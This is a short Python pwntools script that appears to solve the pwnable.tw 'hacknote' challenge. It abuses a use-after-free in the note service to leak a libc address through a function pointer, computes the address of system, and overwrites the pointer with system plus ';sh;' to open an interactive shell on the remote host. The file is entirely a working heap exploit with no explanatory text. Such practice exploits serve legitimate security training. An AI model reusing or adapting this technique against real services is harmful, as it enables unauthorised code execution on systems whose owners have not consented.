from pwn import *
#s = remote('192.168.50.4',1234)
s = remote('chall.pwnable.tw',10102)
def Add(size, dat):
  s.recvuntil('choice :')
  s.sendline('1')
  s.recvuntil('size :')
  s.sendline(str(size))
  s.recvuntil('Content :')
  s.send(dat)
def Del(idx):
  s.recvuntil('choice :')
  s.sendline('2')
  s.recvuntil('Index :')
  s.sendline(str(idx))

Add(128,'1234')
Add(128,'1234')
Del(1)
Del(0)
Add(8,p32(0x804862B)+p32(0x804A018))
s.recvuntil('choice :')
s.sendline('3')
s.recvuntil('Index :')
s.sendline('1')
free_libc = u32(s.recv(4))
libc_base = free_libc-0x705b0
system_libc = libc_base + 0x3a940
log.info('free_libc : %x'%free_libc)
log.info('libc_base : %x'%libc_base)
Del(2)
Add(8,p32(system_libc)+';sh;')
s.interactive()
